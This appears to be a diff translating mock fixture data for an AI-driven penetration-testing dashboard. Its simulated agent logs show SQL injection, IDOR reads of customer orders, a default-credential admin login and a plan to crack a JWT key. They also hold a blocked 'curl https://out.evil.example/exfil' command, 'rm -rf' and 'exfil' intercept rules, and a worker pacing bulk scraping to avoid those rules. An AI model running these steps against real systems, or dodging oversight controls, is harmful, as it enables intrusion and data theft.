   { seq: 45, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t43", summary: "report_finding(SQL Injection, high)" },
-  { seq: 46, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t43", summary: "finding f-1 已记录" },
-  { seq: 47, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:20:00Z"), kind: "result", summary: "SQL 注入确认。", input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },
+  { seq: 46, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t43", summary: "finding f-1 recorded" },
+  { seq: 47, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:20:00Z"), kind: "result", summary: "SQL injection confirmed.", input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },
 
-  // work#5 · i5 IDOR（running）
-  { seq: 50, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:31:00Z"), kind: "thinking", summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。" },
+  // work#5 · i5 IDOR (running)
+  { seq: 50, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:31:00Z"), kind: "thinking", summary: "/v1/orders?id= is an auto-incrementing numeric id, a typical IDOR surface. First fetch your own order, then change the id to see if others can be read." },
   { seq: 51, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t51", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001" },
-  { seq: 52, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t51", summary: "{ \"order_id\":1001, \"user_id\":42, \"amount\":299 }", detail: "自己的订单，正常。" },
+  { seq: 52, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t51", summary: "{ \"order_id\":1001, \"user_id\":42, \"amount\":299 }", detail: "Own order, normal." },
   { seq: 53, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t52", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002" },
-  { seq: 54, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t52", summary: "{ \"order_id\":1002, \"user_id\":77, \"amount\":1299, \"phone\":\"138****6021\", \"address\":\"北京市朝阳区 ****\" }", detail: "越权读到他人订单（含手机号/地址），无归属校验。" },
+  { seq: 54, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t52", summary: "{ \"order_id\":1002, \"user_id\":77, \"amount\":1299, \"phone\":\"138****6021\", \"address\":\"Chaoyang District, Beijing ****\" }", detail: "Unauthorized read of another user's order (including phone number/address), no ownership check." },
   { seq: 55, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t53", summary: "report_finding(IDOR, high)" },
-  { seq: 56, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t53", summary: "finding f-2 已记录" },
-  { seq: 57, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T03:58:10Z"), kind: "thinking", summary: "正在批量遍历 id 范围，评估可越权数据规模（暂不导出，避免触发拦截规则）。" },
+  { seq: 56, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t53", summary: "finding f-2 recorded" },
+  { seq: 57, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T03:58:10Z"), kind: "thinking", summary: "Iterating over the id range in bulk to assess the scale of data accessible via unauthorized access (not exporting yet, to avoid triggering intercept rules)." },
 
-  // work#3 · i3 后台用户接口枚举（running）
-  { seq: 60, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:56:00Z"), kind: "thinking", summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。" },
+  // work#3 · i3 admin panel user endpoint enumeration (running)
+  { seq: 60, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:56:00Z"), kind: "thinking", summary: "With an existing admin panel session, enumerate management endpoints to find an entry point for bulk-exporting sensitive user data (goal ②)." },
   { seq: 61, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t61", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1" },
-  { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。" },
-  { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。" },
+  { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "The management endpoint can return all users with pagination (including email/phone number), about 12,800 records." },
+  { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "Confirmed a bulk user-data read entry point exists; the export action hit the destructive/exfiltration rules, an intercept approval has been submitted and is awaiting clearance." },
 
-  // 主 agent（人在环路对话）
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
-  { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。" },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
-  { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。" },
+  // Main agent (human-in-the-loop conversation)
+  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Where should we start on the admin panel?" },
+  { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com is an Element-UI admin panel, with no CAPTCHA and no rate limit. Recommend trying the default credentials list (admin/admin123) first, then a dictionary. I've injected a high-priority intent to the work agent." },
+  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "We're into the admin panel; what's the focus next?" },
+  { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "Goal ② is reading sensitive user data: advance \"admin panel user endpoint enumeration\" and \"API IDOR\" in parallel. Note that bulk export will trigger the intercept rules and will need your approval to proceed." },
 ];
 
 export function activityForTask(): Activity[] {
@@ -357,7 +357,7 @@ Content-Length: 655
   "order_id": 1002,
   "user_id": 77,
   "amount": 1299.00,
-  "address": "北京市朝阳区 ****",
+  "address": "Chaoyang District, Beijing ****",
   "phone": "138****6021",
   "items": [{ "sku": "A-100", "qty": 1 }]
 }`,
@@ -369,9 +369,9 @@ export const audit: Audit = {
   entries: [
     { ts: T("2026-07-26T03:33:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'username=admin...' https://admin.acme.com/login" },
     { ts: T("2026-07-26T03:57:00Z"), tool: "bash", action: "allow", command: "curl -s -b 'session=...' https://admin.acme.com/api/users" },
-    { ts: T("2026-07-26T02:10:00Z"), tool: "bash", action: "block", reason: "目标越界：out.evil.example 不在 scope 内", command: "curl https://out.evil.example/exfil" },
+    { ts: T("2026-07-26T02:10:00Z"), tool: "bash", action: "block", reason: "Out of scope: out.evil.example is not within scope", command: "curl https://out.evil.example/exfil" },
     { ts: T("2026-07-25T22:03:00Z"), tool: "bash", action: "allow", command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch" },
-    { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "破坏性命令门控：rm -rf 被拒绝", command: "rm -rf /var/www" },
+    { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "Destructive-command gate: rm -rf denied", command: "rm -rf /var/www" },
     { ts: T("2026-07-25T20:30:00Z"), tool: "bash", action: "allow", command: "git-dumper https://www.acme.com/.git/ /tmp/acme" },
   ],
 };
@@ -390,38 +390,38 @@ export const llmConfig = {
 
 // ── Agents ───────────────────────────────────────────────────────────────────
 export const agents: Agent[] = [
-  { id: "1", key: "goals", name: "目标拆解器", role: "goals", builtin: true, enabled: true, description: "把任务目标拆成可探索的子目标", max_turns: 8, mcp_count: 0, skill_count: 1, tool_count: 3 },
-  { id: "2", key: "planner", name: "规划者", role: "planner", builtin: true, enabled: true, description: "读探索路线、判断目标达成、生成意图", max_turns: 0, mcp_count: 1, skill_count: 2, tool_count: 9 },
-  { id: "3", key: "mainagent", name: "主 Agent", role: "mainagent", builtin: true, enabled: true, description: "人在环路对话，注入 hint / 高优意图", max_turns: 0, web_search: true, mcp_count: 2, skill_count: 3, tool_count: 11 },
-  { id: "4", key: "worker", name: "Work Agent", role: "worker", builtin: true, enabled: true, description: "claim 意图 → 跑 Kali 工具 → 图写回", max_turns: 40, run_seconds: 1800, web_search: false, interactive_shell: true, mcp_count: 2, skill_count: 3, tool_count: 14 },
-  { id: "5", key: "recon-bot", name: "侦察机器人（自定义）", role: "custom", builtin: false, enabled: true, description: "定时对新资产做被动侦察", max_turns: 12, mcp_count: 1, skill_count: 1, tool_count: 4 },
+  { id: "1", key: "goals", name: "Goal Decomposer", role: "goals", builtin: true, enabled: true, description: "Splits task goals into explorable sub-goals", max_turns: 8, mcp_count: 0, skill_count: 1, tool_count: 3 },
+  { id: "2", key: "planner", name: "Planner", role: "planner", builtin: true, enabled: true, description: "Reads the exploration route, judges goal completion, generates intents", max_turns: 0, mcp_count: 1, skill_count: 2, tool_count: 9 },
+  { id: "3", key: "mainagent", name: "Main Agent", role: "mainagent", builtin: true, enabled: true, description: "Human-in-the-loop conversation, injects hints / high-priority intents", max_turns: 0, web_search: true, mcp_count: 2, skill_count: 3, tool_count: 11 },
+  { id: "4", key: "worker", name: "Work Agent", role: "worker", builtin: true, enabled: true, description: "claim intent → run Kali tools → write back to the graph", max_turns: 40, run_seconds: 1800, web_search: false, interactive_shell: true, mcp_count: 2, skill_count: 3, tool_count: 14 },
+  { id: "5", key: "recon-bot", name: "Recon Bot (custom)", role: "custom", builtin: false, enabled: true, description: "Periodically runs passive recon on new assets", max_turns: 12, mcp_count: 1, skill_count: 1, tool_count: 4 },
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
-  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
-  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
+  { name: "Goal", description: "Current task goal", example: "Obtain admin panel access on acme.com", source: "runtime" },
+  { name: "AssetSummary", description: "Asset graph overview", example: "6 subdomains / 3 IPs / 4 apps / 4 endpoints", source: "distilled" },
+  { name: "RouteHint", description: "Exploration route hint", example: "Prioritize the admin panel and API unauthorized-access surface", source: "exploration" },
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 Artemis 的规划者……" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 Artemis 的规划者(v2)……" },
+  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Strengthen unauthorized-access probing guidance", template_text: "You are OpenArtemis's planner…" },
+  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "Initial version tweaks", template_text: "You are OpenArtemis's planner (v2)…" },
 ];
 
 export function agentDetail(key: string): AgentDetail {
   const a = agents.find((x) => x.key === key) ?? agents[1];
   return {
     agent: a,
-    prompt: `你是 Artemis 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
+    prompt: `You are OpenArtemis's "${a.name}".\nGoal: {{.Goal}}\nAsset overview: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nBased on the above, advance the exploration and write results back to the graph via tools.`,
     variables: promptVars,
     versions: promptVersions,
     visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
     wrapup_prompt: "",
-    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
+    wrapup_default: "Time/steps are running out; summarize confirmed findings and mark the final state of intents.",
     wrapup_max_turns: 0,
     wrapup_max_turns_default: 3,
     task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
-    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
+    task_timeout_wrapup_default: "Task timed out; finalize immediately and persist current conclusions.",
     task_timeout_wrapup_max_turns_default: 2,
   };
 }
@@ -434,31 +434,31 @@ export const mcpServers: MCPServer[] = [
 
 export const mcpToolsById: Record<number, MCPTool[]> = {
   1: [
-    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
-    { name: "search", description: "Shodan 搜索" },
-    { name: "dns_resolve", description: "DNS 解析" },
+    { name: "host_info", description: "Query Shodan host info for an IP" },
+    { name: "search", description: "Shodan search" },
+    { name: "dns_resolve", description: "DNS resolution" },
   ],
   2: [
-    { name: "browser_navigate", description: "浏览器打开 URL" },
-    { name: "browser_click", description: "点击元素" },
-    { name: "browser_snapshot", description: "抓取可访问性快照" },
+    { name: "browser_navigate", description: "Open a URL in the browser" },
+    { name: "browser_click", description: "Click an element" },
+    { name: "browser_snapshot", description: "Capture an accessibility snapshot" },
   ],
 };
 
 // ── Skills ───────────────────────────────────────────────────────────────────
 export const skills: SkillItem[] = [
-  { name: "api-recon", description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。", license: "MIT", mcps: [], files: ["SKILL.md", "scripts/enum.py"] },
-  { name: "playwright-cli", description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。", mcps: ["playwright"], files: ["SKILL.md"] },
-  { name: "scopesentry", description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。", files: ["SKILL.md", "assets/mapping.md"] },
+  { name: "api-recon", description: "Recon and unauthorized-access surface enumeration for REST/GraphQL APIs; use when new API endpoints are discovered.", license: "MIT", mcps: [], files: ["SKILL.md", "scripts/enum.py"] },
+  { name: "playwright-cli", description: "Drive the browser with Playwright for dynamic crawling and screenshots; use when a JS site needs rendering.", mcps: ["playwright"], files: ["SKILL.md"] },
+  { name: "scopesentry", description: "Pull assets from ScopeSentry and merge them into the company scope; use when bulk-importing assets.", files: ["SKILL.md", "assets/mapping.md"] },
 ];
 
 // ── Tools ────────────────────────────────────────────────────────────────────
 export const tools: Tool[] = [
-  { key: "bash", system: true, description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）", schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] }, agents: ["worker", "mainagent"], enabled: true, kind: "builtin" },
-  { key: "report_finding", system: true, description: "上报一个安全发现并连到相关节点", schema: { type: "object", properties: { vulnclass: { type: "string" }, severity: { type: "string" }, summary: { type: "string" }, evidence: { type: "string" } }, required: ["vulnclass", "severity", "summary"] }, agents: ["worker"], enabled: true, kind: "builtin" },
-  { key: "upsert_asset", system: true, description: "写入/更新资产节点", schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } }, agents: ["worker"], enabled: true, kind: "builtin" },
-  { key: "list_goals", system: true, description: "列出当前任务的目标与达成状态", schema: { type: "object", properties: {} }, agents: ["planner"], enabled: true, kind: "builtin" },
-  { key: "nuclei_scan", system: false, description: "自定义：用 nuclei 跑指定模板", schema: { type: "object", properties: { target: { type: "string" }, template: { type: "string" } }, required: ["target"] }, agents: ["worker"], enabled: true, kind: "command", exec: { command: "nuclei", args: ["-u", "{{target}}"] } },
+  { key: "bash", system: true, description: "Execute shell commands in the Kali environment (subject to scope/destructive gating)", schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] }, agents: ["worker", "mainagent"], enabled: true, kind: "builtin" },
+  { key: "report_finding", system: true, description: "Report a security finding and link it to related nodes", schema: { type: "object", properties: { vulnclass: { type: "string" }, severity: { type: "string" }, summary: { type: "string" }, evidence: { type: "string" } }, required: ["vulnclass", "severity", "summary"] }, agents: ["worker"], enabled: true, kind: "builtin" },
+  { key: "upsert_asset", system: true, description: "Write/update an asset node", schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } }, agents: ["worker"], enabled: true, kind: "builtin" },
+  { key: "list_goals", system: true, description: "List the current task's goals and completion status", schema: { type: "object", properties: {} }, agents: ["planner"], enabled: true, kind: "builtin" },
+  { key: "nuclei_scan", system: false, description: "Custom: run a specified template with nuclei", schema: { type: "object", properties: { target: { type: "string" }, template: { type: "string" } }, required: ["target"] }, agents: ["worker"], enabled: true, kind: "command", exec: { command: "nuclei", args: ["-u", "{{target}}"] } },
 ];
 
 // ── Settings ─────────────────────────────────────────────────────────────────
@@ -475,8 +475,8 @@ export const settings: Settings = {
 
 // ── Intercept ────────────────────────────────────────────────────────────────
 export const interceptRules: InterceptRule[] = [
-  { id: 1, name: "破坏性命令需审批", enabled: true, priority: 10, match_target: "tool_input", match_type: "regex", pattern: "rm\\s+-rf|mkfs|dd\\s+if=", action: "ask", message: "检测到破坏性命令，需人工审批", timeout_enabled: true, timeout_seconds: 120, timeout_action: "deny", created_at: T("2026-07-20T10:00:00Z"), updated_at: T("2026-07-20T10:00:00Z") },
-  { id: 2, name: "外发流量直接拒绝", enabled: true, priority: 20, match_target: "tool_input", match_type: "string", pattern: "exfil", action: "deny", message: "疑似外发数据", timeout_enabled: false, timeout_seconds: 0, timeout_action: "deny", created_at: T("2026-07-21T10:00:00Z"), updated_at: T("2026-07-21T10:00:00Z") },
+  { id: 1, name: "Destructive commands require approval", enabled: true, priority: 10, match_target: "tool_input", match_type: "regex", pattern: "rm\\s+-rf|mkfs|dd\\s+if=", action: "ask", message: "Destructive command detected, manual approval required", timeout_enabled: true, timeout_seconds: 120, timeout_action: "deny", created_at: T("2026-07-20T10:00:00Z"), updated_at: T("2026-07-20T10:00:00Z") },
+  { id: 2, name: "Outbound traffic denied outright", enabled: true, priority: 20, match_target: "tool_input", match_type: "string", pattern: "exfil", action: "deny", message: "Suspected data exfiltration", timeout_enabled: false, timeout_seconds: 0, timeout_action: "deny", created_at: T("2026-07-21T10:00:00Z"), updated_at: T("2026-07-21T10:00:00Z") },
 ];
 
 export const interceptPending: InterceptPending[] = [
@@ -484,35 +484,35 @@ export const interceptPending: InterceptPending[] = [
 ];
 
 export const interceptHistory: InterceptApprovalRow[] = [
-  { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "破坏性命令需审批" },
+  { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "Destructive commands require approval" },
   { id: 91, task_id: "t-acme-api", agent_name: "work#2", tool_name: "bash", tool_input: { command: "nmap -sV 203.0.113.11" }, status: "allowed", created_at: T("2026-07-25T18:00:00Z"), decided_at: T("2026-07-25T18:00:05Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
 ];
 
 // ── Conversations (chat) ─────────────────────────────────────────────────────
 export const conversations: Conversation[] = [
-  { id: 1, agent_key: "mainagent", title: "acme 后台切入点讨论", llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
-  { id: 2, agent_key: "mainagent", title: "API 越权面梳理", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
+  { id: 1, agent_key: "mainagent", title: "acme admin panel entry-point discussion", llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
+  { id: 2, agent_key: "mainagent", title: "API unauthorized-access surface review", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
 ];
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
-    { seq: 2, worker: "mainagent", ts: T("2026-07-25T10:00:04Z"), kind: "thinking", summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。" },
+    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Where's the admin panel, and where do we start?" },
+    { seq: 2, worker: "mainagent", ts: T("2026-07-25T10:00:04Z"), kind: "thinking", summary: "First confirm the tech stack and protections (CAPTCHA/rate limit) of the admin.acme.com login page, then decide between default credentials and a dictionary." },
     { seq: 3, worker: "mainagent", ts: T("2026-07-25T10:00:06Z"), kind: "tool_use", tool: "bash", tool_use_id: "c11", summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'" },
-    { seq: 4, worker: "mainagent", ts: T("2026-07-25T10:00:08Z"), kind: "tool_result", tool: "bash", tool_use_id: "c11", summary: "element-ui\ncsrf", detail: "Element-UI 后台，有 CSRF token 但无验证码。" },
+    { seq: 4, worker: "mainagent", ts: T("2026-07-25T10:00:08Z"), kind: "tool_result", tool: "bash", tool_use_id: "c11", summary: "element-ui\ncsrf", detail: "Element-UI admin panel, has a CSRF token but no CAPTCHA." },
     { seq: 5, worker: "mainagent", ts: T("2026-07-25T10:00:20Z"), kind: "tool_use", tool: "bash", tool_use_id: "c12", summary: "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done" },
-    { seq: 6, worker: "mainagent", ts: T("2026-07-25T10:00:24Z"), kind: "tool_result", tool: "bash", tool_use_id: "c12", summary: "401\\n401\\n401\\n401\\n401", detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。" },
-    { seq: 7, worker: "mainagent", ts: T("2026-07-25T10:00:30Z"), kind: "text", summary: "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。" },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
-    { seq: 9, worker: "mainagent", ts: T("2026-07-26T03:40:05Z"), kind: "text", summary: "成了 —— admin/admin123 直接登进控制台，已记为高危发现并证明「获取后台管理权限」目标达成。下一步转向读用户数据（目标②）。" },
+    { seq: 6, worker: "mainagent", ts: T("2026-07-25T10:00:24Z"), kind: "tool_result", tool: "bash", tool_use_id: "c12", summary: "401\\n401\\n401\\n401\\n401", detail: "5 consecutive attempts with no lockout/no CAPTCHA → no rate limit, brute-forceable." },
+    { seq: 7, worker: "mainagent", ts: T("2026-07-25T10:00:30Z"), kind: "text", summary: "Conclusion: Element-UI admin panel, no CAPTCHA, no rate limit. Entry order: ① first run the default credentials list (admin/admin, admin/admin123, admin/123456) ② if none hit, try the top1000 dictionary. I've injected \"admin panel default credential testing\" as a high-priority intent to the work agent." },
+    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it work?" },
+    { seq: 9, worker: "mainagent", ts: T("2026-07-26T03:40:05Z"), kind: "text", summary: "It worked: admin/admin123 logged straight into the console, recorded as a high-severity finding and proving the \"obtain admin panel access\" goal is met. Next we pivot to reading user data (goal ②)." },
   ],
   2: [
-    { seq: 1, worker: "user", ts: T("2026-07-24T16:00:00Z"), kind: "user", summary: "帮我梳理下 api.acme.com 的越权面。" },
-    { seq: 2, worker: "mainagent", ts: T("2026-07-24T16:00:05Z"), kind: "thinking", summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。" },
+    { seq: 1, worker: "user", ts: T("2026-07-24T16:00:00Z"), kind: "user", summary: "Help me review the unauthorized-access surface of api.acme.com." },
+    { seq: 2, worker: "mainagent", ts: T("2026-07-24T16:00:05Z"), kind: "thinking", summary: "First probe the API's authentication method and the behavior of a few key endpoints, then assess IDOR / JWT risk." },
     { seq: 3, worker: "mainagent", ts: T("2026-07-24T16:00:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "c21", summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'" },
-    { seq: 4, worker: "mainagent", ts: T("2026-07-24T16:00:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c21", summary: "{ \"id\": 42, \"role\": \"user\" }", detail: "普通用户 token 可用。" },
-    { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法" },
-    { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 对称签名，若密钥弱可离线爆破伪造。" },
-    { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。" },
+    { seq: 4, worker: "mainagent", ts: T("2026-07-24T16:00:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c21", summary: "{ \"id\": 42, \"role\": \"user\" }", detail: "Normal user token works." },
+    { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # check the algorithm" },
+    { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 symmetric signature; if the key is weak it can be brute-forced offline and forged." },
+    { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "Two unauthorized-access surfaces: ① /v1/orders?id= is an auto-incrementing numeric id → typical IDOR, change the id to try reading others' orders; ② JWT uses HS256, try john/hashcat to crack the key → arbitrary sub can be forged for unauthorized access. I've derived an intent for each of these. Recommend doing IDOR first (low cost, direct impact)." },
   ],
 };
